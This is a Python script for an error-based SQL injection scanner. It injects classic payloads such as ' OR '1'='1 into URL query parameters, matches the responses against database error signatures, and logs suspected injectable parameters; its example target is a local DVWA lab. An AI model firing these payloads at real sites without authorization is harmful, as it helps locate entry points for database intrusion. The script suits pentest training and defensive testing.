#!/usr/bin/env python3
"""

Description:
    - Takes a URL with query parameters
    - Injects common SQL payloads into one or all parameters
    - Looks for database error messages in the response
    - Logs potential SQL injection points to a report file


"""

import argparse
import time
from typing import List, Dict, Tuple
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# ---------------- CONFIG ---------------- #

SQL_PAYLOADS: List[str] = [
    "'",                  # Breaks out of quotes
    "' OR '1'='1",        # Classic boolean-based
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1 OR 1=1",
]

ERROR_SIGNATURES: List[str] = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "sqlstate[hy000]",
    "unclosed quotation mark after the character string",
    "odbc sql server driver",
    "native client",
    "pg_query()",
    "syntax error at or near",
]

REQUEST_TIMEOUT: int = 7
DEFAULT_DELAY: float = 0.5


# ---------------- UTILS ---------------- #

def parse_url_params(url: str) -> Dict[str, List[str]]:
    """Return query parameters as a dict {param: [values]}."""
    parsed = urlparse(url)
    return parse_qs(parsed.query)


def build_url_with_params(base_url: str, params: Dict[str, List[str]]) -> str:
    """Return a URL with updated query parameters."""
    parsed = urlparse(base_url)
    query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=query))


def inject_payload(url: str, param: str, payload: str) -> str:
    """
    Return a new URL where `param` has its original value + payload.
    If param does not exist, returns original URL.
    """
    params = parse_url_params(url)
    if param not in params:
        return url
    original_value = params[param][0]
    params[param] = [original_value + payload]
    return build_url_with_params(url, params)


def send_request(url: str) -> Tuple[bool, str]:
    """Send GET request and return (success, response_text)."""
    try:
        response = requests.get(url, timeout=REQUEST_TIMEOUT)
        return True, response.text.lower()
    except Exception as e:
        print(f"[ERROR] Request failed for {url}: {e}")
        return False, ""


def looks_vulnerable(response_text: str) -> bool:
    """Check if response text contains any common SQL error signature."""
    for sig in ERROR_SIGNATURES:
        if sig in response_text:
            return True
    return False


# ---------------- SCANNER CORE ---------------- #

def scan_param(url: str, param: str, delay: float, report_file: str) -> int:
    """
    Test a single parameter with all SQL payloads.
    Returns number of times it looked vulnerable.
    """
    vuln_count = 0
    print(f"\n[SCAN] Testing parameter '{param}'")

    for payload in SQL_PAYLOADS:
        injected_url = inject_payload(url, param, payload)
        if injected_url == url:
            print(f"[WARN] Parameter '{param}' not found in URL.")
            return 0

        print(f"[TEST] {param} with payload: {payload}")
        success, text = send_request(injected_url)
        if not success:
            continue

        if looks_vulnerable(text):
            vuln_count += 1
            line = f"[VULNERABLE] url={injected_url} | param={param} | payload={payload}"
            print(line)
            with open(report_file, "a", encoding="utf-8") as f:
                f.write(line + "\n")

        time.sleep(delay)

    return vuln_count


def scan_sql_injection(url: str, param: str | None, delay: float, report_file: str) -> None:
    """
    Main scan function:
        - If param is given, test only that parameter.
        - If param is None, test all parameters in the URL.
    """
    all_params = list(parse_url_params(url).keys())
    if not all_params:
        print("[ERROR] No query parameters found in the URL. Example:")
        print("        http://target.com/page.php?id=1&cat=2")
        return

    # Prepare report header
    with open(report_file, "w", encoding="utf-8") as f:
        f.write("SQL Injection Scan Report\n")
        f.write(f"Target URL: {url}\n")
        f.write(f"Parameters found: {all_params}\n")
        f.write("============================================\n\n")

    total_tests = 0
    total_vulns = 0

    if param:
        if param not in all_params:
            print(f"[ERROR] Parameter '{param}' not found in URL. Available: {all_params}")
            return
        params_to_test = [param]
    else:
        params_to_test = all_params

    for p in params_to_test:
        print(f"\n[INFO] Testing parameter: {p}")
        tests_for_param = len(SQL_PAYLOADS)
        total_tests += tests_for_param
        vulns = scan_param(url, p, delay, report_file)
        total_vulns += vulns

    summary = (
        "\n========== SCAN SUMMARY ==========\n"
        f"Target URL: {url}\n"
        f"Parameters tested: {params_to_test}\n"
        f"Total tests performed: {total_tests}\n"
        f"Total potential SQLi points found: {total_vulns}\n"
        f"Report file: {report_file}\n"
        "==================================\n"
    )
    print(summary)
    with open(report_file, "a", encoding="utf-8") as f:
        f.write(summary)


# ---------------- CLI ENTRY ---------------- #

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Basic SQL Injection Scanner (Error-based)"
    )
    parser.add_argument(
        "--url",
        required=True,
        help="Target URL with query parameters (e.g. http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit)"
    )
    parser.add_argument(
        "--param",
        default=None,
        help="Specific parameter to test (optional). If omitted, all parameters are tested."
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=DEFAULT_DELAY,
        help="Delay between requests in seconds (default: 0.5)"
    )
    parser.add_argument(
        "--report",
        default="reports/sql_report.txt",
        help="Path to report file (default: reports/sql_report.txt)"
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    print("[INFO] Starting SQL Injection scan with settings:")
    print(f"       URL    : {args.url}")
    print(f"       Param  : {args.param if args.param else 'ALL parameters'}")
    print(f"       Delay  : {args.delay}s")
    print(f"       Report : {args.report}")
    print("-" * 40)

    scan_sql_injection(
        url=args.url,
        param=args.param,
        delay=args.delay,
        report_file=args.report,
    )


if __name__ == "__main__":
    main()
